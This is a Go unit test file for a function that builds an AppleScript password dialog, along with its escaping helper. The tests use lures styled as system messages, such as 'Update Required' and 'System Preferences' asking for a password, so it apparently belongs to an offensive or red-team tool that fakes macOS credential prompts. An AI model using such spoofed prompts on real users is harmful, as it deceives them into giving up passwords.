package commands

import (
	"strings"
	"testing"
)

func TestBuildCredPromptScript(t *testing.T) {
	tests := []struct {
		name    string
		title   string
		message string
		icon    string
		wantIn  []string // substrings that must be present
	}{
		{
			name:    "basic dialog",
			title:   "Update Required",
			message: "Enter your password",
			icon:    "caution",
			wantIn:  []string{"display dialog", "Enter your password", "Update Required", "caution", "hidden answer", "Cancel", "OK"},
		},
		{
			name:    "custom icon",
			title:   "Security Check",
			message: "Verify your identity",
			icon:    "stop",
			wantIn:  []string{"Security Check", "Verify your identity", "stop"},
		},
		{
			name:    "note icon",
			title:   "System Preferences",
			message: "Authentication needed",
			icon:    "note",
			wantIn:  []string{"note"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			script := buildCredPromptScript(tt.title, tt.message, tt.icon)
			for _, want := range tt.wantIn {
				if !strings.Contains(script, want) {
					t.Errorf("script missing %q:\n%s", want, script)
				}
			}
		})
	}
}

func TestBuildCredPromptScriptStructure(t *testing.T) {
	script := buildCredPromptScript("Title", "Message", "caution")

	// Must start with display dialog
	if !strings.HasPrefix(script, "display dialog") {
		t.Errorf("script should start with 'display dialog', got: %s", script[:min(50, len(script))])
	}

	// Must have with hidden answer (password field)
	if !strings.Contains(script, "with hidden answer") {
		t.Error("script must include 'with hidden answer' for password masking")
	}

	// Must have default answer "" for text input
	if !strings.Contains(script, `default answer ""`) {
		t.Error("script must include 'default answer \"\"' for text input field")
	}

	// Must return the text
	if !strings.Contains(script, "text returned") {
		t.Error("script must extract text returned from result")
	}
}

func TestEscapeAppleScript(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "no special chars",
			input: "Hello World",
			want:  "Hello World",
		},
		{
			name:  "double quotes",
			input: `He said "hello"`,
			want:  `He said \"hello\"`,
		},
		{
			name:  "backslash",
			input: `path\to\file`,
			want:  `path\\to\\file`,
		},
		{
			name:  "both quotes and backslash",
			input: `say \"hi\"`,
			want:  `say \\\"hi\\\"`,
		},
		{
			name:  "empty string",
			input: "",
			want:  "",
		},
		{
			name:  "single quotes pass through",
			input: "it's fine",
			want:  "it's fine",
		},
		{
			name:  "newlines pass through",
			input: "line1\nline2",
			want:  "line1\nline2",
		},
		{
			name:  "multiple consecutive quotes",
			input: `""test""`,
			want:  `\"\"test\"\"`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := escapeAppleScript(tt.input)
			if got != tt.want {
				t.Errorf("escapeAppleScript(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestBuildCredPromptScriptEscaping(t *testing.T) {
	// Ensure special characters in title/message are properly escaped
	script := buildCredPromptScript(`Title "with quotes"`, `Click "OK" to continue`, "caution")

	// The escaped versions should appear in the script
	if !strings.Contains(script, `Title \"with quotes\"`) {
		t.Errorf("title quotes not escaped in script: %s", script)
	}
	if !strings.Contains(script, `Click \"OK\" to continue`) {
		t.Errorf("message quotes not escaped in script: %s", script)
	}
}

func TestBuildCredPromptScriptBackslashInInput(t *testing.T) {
	script := buildCredPromptScript(`C:\Users\test`, `Enter password for C:\path`, "caution")

	if !strings.Contains(script, `C:\\Users\\test`) {
		t.Errorf("backslash in title not escaped: %s", script)
	}
	if !strings.Contains(script, `C:\\path`) {
		t.Errorf("backslash in message not escaped: %s", script)
	}
}
